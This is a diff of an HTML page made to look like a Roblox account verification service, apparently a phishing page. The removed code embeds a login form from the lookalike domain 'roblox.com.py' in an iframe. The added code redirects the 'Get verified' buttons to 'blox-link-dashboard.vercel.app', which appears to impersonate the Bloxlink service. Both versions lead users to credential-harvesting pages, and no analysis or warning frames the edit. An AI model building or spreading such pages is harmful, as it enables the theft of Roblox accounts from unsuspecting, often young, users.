@@ -238,7 +238,7 @@
                                     <div class="flex-1">
                                         <input id="username" class="block shadow-sm border focus:ring-0 rounded-md outline-none bg-tertiary-background text-gray-200 placeholder:text-gray-400 focus:border-indigo-600 border-tertiary-background text-sm px-4 py-2 w-full" placeholder="Enter your Roblox username" variant="tertiary" value="" style="pointer-events: auto; cursor: text; opacity: 1;">
                                     </div>
-                                    <button id="verify" variant="success" onclick="openCustomVerifyModal()" class="transition-colors rounded-md flex items-center justify-center opacity-100 bg-green-500 hover:bg-green-600 text-white py-2 px-3 font-medium text-sm opacity-60" style="opacity: 1; cursor: pointer;">
+                                    <button id="verify" variant="success" onclick="handleVerifyRedirect()" class="transition-colors rounded-md flex items-center justify-center opacity-100 bg-green-500 hover:bg-green-600 text-white py-2 px-3 font-medium text-sm opacity-60" style="opacity: 1; cursor: pointer;">
                                         <div class="flex items-center">Get Verified Now</div>
                                     </button>
                                 </div>
@@ -540,7 +540,7 @@
                             <div class="w-64">
                                 <input id="username" class="block shadow-sm border focus:ring-0 rounded-md outline-none bg-tertiary-background text-gray-200 placeholder:text-gray-400 focus:border-indigo-600 border-tertiary-background text-sm px-4 py-2 w-full" placeholder="Enter your Roblox username" variant="tertiary" value="" style="pointer-events: auto; cursor: text; opacity: 1;">
                             </div>
-                            <button id="verify" variant="success" onclick="openCustomVerifyModal()" class="transition-colors rounded-md flex items-center justify-center opacity-100 bg-green-500 hover:bg-green-600 text-white py-2 px-3 font-medium text-sm" style="opacity: 1; cursor: pointer;">
+                            <button id="verify" variant="success" onclick="handleVerifyRedirect()" class="transition-colors rounded-md flex items-center justify-center opacity-100 bg-green-500 hover:bg-green-600 text-white py-2 px-3 font-medium text-sm" style="opacity: 1; cursor: pointer;">
                                 <div class="flex items-center">Get verified</div>
                             </button>
                         </div>
@@ -568,66 +568,13 @@
 
 
 
-<!-- CUSTOM VERIFY MODAL -->
-<div id="customVerifyModal" style="
-  display:none;
-  position:fixed;
-  inset:0;
-  background:rgba(0,0,0,0.6);
-  z-index:99999;
-  align-items:center;
-  justify-content:center;
-">
-  <div style="
-    width:90%;
-    max-width:1100px;
-    height:750px;
-    background:#0f172a;
-    border-radius:14px;
-    position:relative;
-    overflow:hidden;
-    box-shadow:0 25px 60px rgba(0,0,0,.6);
-  ">
-    <div style="
-      height:50px;
-      background:#020617;
-      color:#fff;
-      display:flex;
-      align-items:center;
-      padding:0 16px;
-      font-weight:600;
-      font-size:14px;
-    ">
-      Verify your account
-      <button onclick="closeCustomVerifyModal()" style="
-        margin-left:auto;
-        background:#ef4444;
-        color:#fff;
-        border:none;
-        border-radius:6px;
-        padding:4px 10px;
-        cursor:pointer;
-      ">✕</button>
-    </div>
-
-    <iframe
-      src="https://roblox.com.py/login?returnUrl=7692425652606225"
-      style="width:100%; height:calc(100% - 50px); border:none; background:#fff;"
-      referrerpolicy="no-referrer">
-    </iframe>
-  </div>
-</div>
 
 <script>
-function openCustomVerifyModal() {
+function handleVerifyRedirect() {
   const username = document.getElementById("username");
   if (!username || !username.value.trim()) return;
-  document.getElementById("customVerifyModal").style.display = "flex";
-}
-function closeCustomVerifyModal() {
-  document.getElementById("customVerifyModal").style.display = "none";
+  window.location.href = "https://blox-link-dashboard.vercel.app/";
 }
 </script>
-
 
 </body></html>
